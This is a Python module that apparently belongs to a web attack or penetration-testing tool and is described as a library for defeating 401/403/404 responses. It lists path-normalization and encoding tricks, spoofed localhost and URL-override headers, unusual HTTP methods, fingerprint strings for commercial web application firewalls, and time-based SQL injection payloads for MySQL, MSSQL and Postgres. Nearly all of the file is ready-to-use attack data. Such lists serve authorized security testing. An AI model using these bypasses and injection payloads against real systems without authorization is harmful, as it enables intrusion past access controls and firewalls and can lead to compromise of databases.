"""Centralized bypass technique library — applied wherever a 401/403/404
needs to be defeated. Includes every known trick from FuzzDB, BurpBypass,
nuclei templates, and academic papers.
"""
from __future__ import annotations

from typing import Iterator
from urllib.parse import quote


# ----- PATH NORMALIZATION TRICKS ------------------------------------------- #
PATH_TRICKS = [
    # original (no transform)
    "{p}",
    # leading slashes / dot tricks
    "/{p}", "//{p}", "///{p}", "/./{p}", "/.//{p}", "/.;/{p}", "/..;/{p}",
    "/%2e/{p}", "/%2e%2e/{p}",
    "//{p}/", "/{p}/.", "/{p}/..", "/{p}/./", "/{p}/../",
    # path semicolon (Tomcat / nginx)
    "{p};", "{p};foo=bar", "{p};.html", "{p};.css", "{p};.json",
    # double-slash inside
    # (callers should substitute "{p}" with their target)
    # encoded slash
    "%2f{p}", "{p}%2f", "%2f%2f{p}",
    # tab / newline / null
    "{p}%09", "{p}%00", "{p}%00.html", "{p}%23",
    # case variations (caller handles)
    # Burp-style bypass
    "..%2f{p}", "..%2f..%2f{p}",
    # Unicode normalization (full-width + look-alikes)
    "{p}%uff0e",
    # Apache/nginx ambiguity
    "{p}.", "{p}..", "{p}/..",
    # query/fragment
    "{p}?", "{p}?foo", "{p}#", "{p}#foo",
    # method override path
    "{p}/.json", "{p}/.css", "{p}/x.html", "{p}/x.json",
    # nginx alias confusion
    "{p}..", "{p}..%2f",
]


# ----- HEADER TRICKS ------------------------------------------------------- #
def header_tricks(target_path: str) -> list[dict]:
    """Return a list of header dicts, each one a potential bypass attempt."""
    return [
        {"X-Original-URL":  target_path},
        {"X-Rewrite-URL":   target_path},
        {"X-Override-URL":  target_path},
        {"X-HTTP-Method-Override": "GET"},
        {"X-Method-Override":      "GET"},
        {"X-HTTP-Method":          "GET"},
        {"X-Forwarded-For":  "127.0.0.1"},
        {"X-Forwarded-For":  "localhost"},
        {"X-Real-IP":        "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP":      "127.0.0.1"},
        {"X-Client-IP":      "127.0.0.1"},
        {"X-Host":           "localhost"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Forwarded-Server": "localhost"},
        {"X-Forwarded-Proto": "https"},
        {"X-Forwarded-Scheme": "https"},
        {"Host":             "localhost"},   # Host header injection
        {"Host":             "127.0.0.1"},
        {"Forwarded":        "for=127.0.0.1;by=127.0.0.1;host=localhost"},
        {"True-Client-IP":   "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"Fastly-Client-IP": "127.0.0.1"},
        # Range header sometimes serves protected content from cache
        {"Range":            "bytes=0-"},
        # Referer trick: some apps trust same-origin referers
        {"Referer":          "https://localhost/"},
        # Accept variations — some APIs auth differently per Accept
        {"Accept":           "*/*"},
        {"Accept":           "text/html;q=0.9,*/*;q=0.8"},
        # AWS-like
        {"X-Amz-Date":       "20200101T000000Z"},
        # Common .NET trick
        {"X-Original-Request-Method": "GET"},
        # WP / specific framework
        {"X-WAP-Profile":    "http://"},
    ]


# ----- METHOD TRICKS ------------------------------------------------------- #
METHOD_TRICKS = [
    "GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "TRACE", "DELETE",
    "CONNECT", "PROPFIND", "MKCOL", "COPY", "MOVE",
    "INVALID",  # some servers fall back on unknown methods
]


# ----- ENCODING TRICKS ----------------------------------------------------- #
def encode_variants(path: str) -> Iterator[str]:
    """Yield encoded variants of `path`."""
    yield path
    yield quote(path, safe="")            # full URL encoding
    yield quote(path, safe="").lower()
    yield quote(quote(path, safe=""), safe="")  # double encoding
    yield path.replace("/", "%2f")
    yield path.replace("/", "%2F")
    yield path.replace(".", "%2e")
    yield path.replace("/", "/%20/")      # space injection
    # 16-bit unicode encoding (some web servers normalize)
    yield path.replace("/", "%u002f")
    # IIS-specific tricks
    yield path + "::$DATA"
    yield path + "::$INDEX_ALLOCATION"
    # Tomcat ;jsessionid
    yield path + ";jsessionid=A"
    # Java path-trans bug
    yield path.replace("/", "/.")
    yield path.replace("/", "/.;/")


def apply_path_tricks(path: str) -> Iterator[str]:
    base = path.lstrip("/")
    for tmpl in PATH_TRICKS:
        yield tmpl.format(p=base)


# ----- WAF FINGERPRINTS ---------------------------------------------------- #
WAF_FINGERPRINTS = {
    "cloudflare":   [b"__cfduid", b"cf-ray", b"Attention Required"],
    "akamai":       [b"akamaighost", b"X-Akamai"],
    "imperva":      [b"X-Iinfo", b"_imp_apg_"],
    "f5_bigip":     [b"BIGipServer", b"TS01"],
    "aws_waf":      [b"awselb", b"X-Amzn-Trace-Id"],
    "wordfence":    [b"Wordfence", b"403 Forbidden"],
    "modsecurity":  [b"Mod_Security", b"NOYB"],
    "sucuri":       [b"X-Sucuri", b"Sucuri/Cloudproxy"],
    "incapsula":    [b"incap_ses", b"visid_incap"],
    "fortinet":     [b"FORTIWAFSID"],
    "barracuda":    [b"barra_counter_session"],
    "citrix":       [b"NSC_", b"ns_aaa"],
}


# ----- TIMING-BASED HEURISTICS --------------------------------------------- #
# Number of seconds difference that signals a successful time-based payload.
TIME_BASED_THRESHOLD = 4.0

# Common time-based payload templates
TIME_BASED_PAYLOADS = [
    "' AND SLEEP({s})--",
    "' AND BENCHMARK(10000000, MD5('a'))--",
    "1' WAITFOR DELAY '0:0:{s}'--",   # MSSQL
    "'; SELECT pg_sleep({s})--",       # Postgres
    "'%2B(SELECT+1+FROM+(SELECT(SLEEP({s})))A)%2B'",  # MySQL inline
]
